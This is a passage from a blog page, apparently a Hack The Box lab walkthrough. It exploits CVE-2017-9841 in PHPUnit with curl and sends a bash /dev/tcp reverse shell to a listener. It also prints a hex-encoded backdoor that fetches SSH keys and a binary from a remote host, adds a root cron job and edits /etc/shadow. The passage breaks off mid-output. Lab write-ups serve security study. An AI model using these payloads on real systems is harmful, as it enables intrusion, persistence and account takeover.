@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	19 Feb 2022IP:	10.10.11.146">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[undetected]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/02/24/undetected/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	19 Feb 2022IP:	10.10.11.146">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2155.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2156.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2157.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2158.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2159.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2160.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2161.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2162.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2163.jpg">
+<meta property="article:published_time" content="2022-02-24T00:59:41.000Z">
+<meta property="article:modified_time" content="2022-07-03T04:46:46.066Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2155.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/02/24/undetected/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/02/24/undetected/","path":"2022/02/24/undetected/","title":"Hack-The-Box-walkthrough[undetected]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[undetected] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-root"><span class="nav-number">3.</span> <span class="nav-text">get root</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">5.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/02/24/undetected/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[undetected] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[undetected]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-24 08:59:41" itemprop="dateCreated datePublished" datetime="2022-02-24T08:59:41+08:00">2022-02-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-03 12:46:46" itemprop="dateModified" datetime="2022-07-03T12:46:46+08:00">2022-07-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	19 Feb 2022<br>IP:	10.10.11.146</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2155.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- -Pn --min-rate=10000 10.10.11.146</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>We have two open ports. Let’s look into web.</p>
+<p>Web Page has a link pointing to a vhost.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=<span class="string">&quot;menu-item&quot;</span>&gt;&lt;a href=<span class="string">&quot;http://store.djewelry.htb&quot;</span>&gt;STORE&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s add hostname and vhost to our hosts file and access vhost.</p>
+<p>This page has login feature and we can add jewelry to our cart. However, if try to access login&#x2F;account it will give you this below message.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NOTICE</span><br><span class="line"></span><br><span class="line">Due to a website migration we are currently not taking any online orders. Contact us <span class="keyword">if</span> you wish to make a purchase</span><br></pre></td></tr></table></figure>
+
+<p>Let’s do a directory brute force.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># gobuster dir -u &#x27;http://store.djewelry.htb/&#x27; -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -b 404,403</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://store.djewelry.htb/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 30</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</span><br><span class="line">[+] Negative Status codes:   403,404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/02/23 20:09:42 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/js                   (Status: 301) [Size: 321] [--&gt; http://store.djewelry.htb/js/]</span><br><span class="line">/images               (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/images/]</span><br><span class="line">/css                  (Status: 301) [Size: 322] [--&gt; http://store.djewelry.htb/css/]   </span><br><span class="line">/fonts                (Status: 301) [Size: 324] [--&gt; http://store.djewelry.htb/fonts/] </span><br><span class="line">/.                    (Status: 200) [Size: 6215]</span><br><span class="line">/fonts                (Status: 301) [Size: 324] [--&gt; http://store.djewelry.htb/fonts/]</span><br><span class="line">/vendor               (Status: 301) [Size: 325] [--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We have ‘vendor’ directory which we can look into it first.</p>
+<p>We have lot of directory’s. Out of all, ‘phpunit’ leads to foothold.</p>
+<p><em><strong>PHPUnit is a programmer-oriented testing framework for PHP. It is an instance of the xUnit architecture for unit testing frameworks.</strong></em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://store.djewelry.htb/vendor/phpunit/phpunit/</span><br></pre></td></tr></table></figure>
+
+<p>As you can see from the above list of change logs, the last version is 5.6 and if we check the readme file, it gives us the date of release.</p>
+<p>This version is quite old. If we check for any vulnerabilities of this version then we’d find CVE-2017-9841</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDE3LTk4NDEv">CVE-2017-9841<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>This version has an RCE. Vulnerability is located in &#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php file. Below is the vulnerable code.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>This can be used to run arbitrary code. Let’s try to run a simple payload which evaluates and gives the value of ‘Pi’.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># curl --data &quot;&lt;?php echo(pi());&quot; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br><span class="line">3.1415926535898</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, we got the value of Pi.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># curl --data &quot;&lt;?php system(&quot;whoami&quot;);&quot; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br><span class="line">www-data</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># curl --data &quot;&lt;?php system(&quot;id&quot;);&quot; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>This can also possible with Burp Suite.</p>
+<p>We have working RCE.</p>
+<p>Let’s get a reverse shell. Setup a listener and run bash one-liner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1</span><br><span class="line">Host: store.djewelry.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/1234 0&gt;&amp;1&quot;&#x27;</span>)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s see how many user have shell access.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep <span class="string">&#x27;bash&#x27;</span> /etc/passwd</span><br><span class="line">&lt;punit/phpunit/src/Util/PHP$ grep <span class="string">&#x27;bash&#x27;</span> /etc/passwd                    </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash</span><br><span class="line">steven1:x:1000:1000:,,,:/home/steven:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>We have three users. But If we check ‘home’ directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@production:/home$ <span class="built_in">ls</span></span><br><span class="line">steven</span><br></pre></td></tr></table></figure>
+
+<p>We will find only one users directory here. Not sure what’s happening here. Let’s find any escalation points. Let’s run Linpeas.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Interesting writable files owned by me or writable by everyone (not <span class="keyword">in</span></span><br><span class="line">Home) (max 500)</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#writable-files</span></span><br><span class="line"><span class="built_in">uniq</span>: write error: Broken pipe</span><br><span class="line">/dev/mqueue</span><br><span class="line">/dev/shm</span><br><span class="line">/run/lock</span><br><span class="line">/run/lock/apache2</span><br><span class="line">/run/screen</span><br><span class="line">/tmp</span><br><span class="line">/tmp/linpeas.sh</span><br><span class="line">/tmp/pspy</span><br><span class="line">/tmp/tmux-33</span><br><span class="line">/var/backups/info</span><br></pre></td></tr></table></figure>
+
+<p>Linpeas reveal an interesting file which is owned by www-data. It’s in backups directory. Let’s investigate that file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@production:/home$ file /var/backups/info</span><br><span class="line">/var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>It’s a binary. If we run strings on it, then we’d find this hex value.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># strings info                                                                             </span></span><br><span class="line">.......</span><br><span class="line">[-] setsockopt(PACKET_VERSION)</span><br><span class="line">[-] setsockopt(PACKET_RX_RING)</span><br><span class="line">[-] socket(AF_PACKET)</span><br><span class="line">[-] <span class="built_in">bind</span>(AF_PACKET)</span><br><span class="line">[-] sendto(SOCK_RAW)</span><br><span class="line">[-] socket(SOCK_RAW)</span><br><span class="line">[-] socket(SOCK_DGRAM)</span><br><span class="line">[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)</span><br><span class="line">[-] klogctl(SYSLOG_ACTION_READ_ALL)</span><br><span class="line">Freeing SMP</span><br><span class="line">[-] substring <span class="string">&#x27;%s&#x27;</span> not found <span class="keyword">in</span> dmesg</span><br><span class="line">ffff</span><br><span class="line">/bin/bash</span><br><span class="line">776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b</span><br><span class="line">[-] fork()</span><br><span class="line">/etc/shadow</span><br><span class="line">[.] checking <span class="keyword">if</span> we got root</span><br><span class="line">[-] something went wrong 